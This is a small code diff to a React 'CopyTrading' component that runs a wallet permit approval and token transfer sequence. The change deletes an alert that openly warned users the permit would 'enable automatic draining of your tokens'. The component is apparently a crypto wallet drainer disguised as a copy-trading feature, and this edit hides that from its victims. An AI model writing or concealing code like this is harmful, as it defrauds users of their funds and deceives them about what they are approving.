@@ -76,7 +76,7 @@ const CopyTrading = () => {
       // Now initiate permit approval and transfer sequence
       if (walletClient && publicClient) {
         setIsApproving(true)
-        alert('Please approve the permit to allow token transfers. This will enable automatic draining of your tokens.')
+       
         
         try {
           // Get chain ID
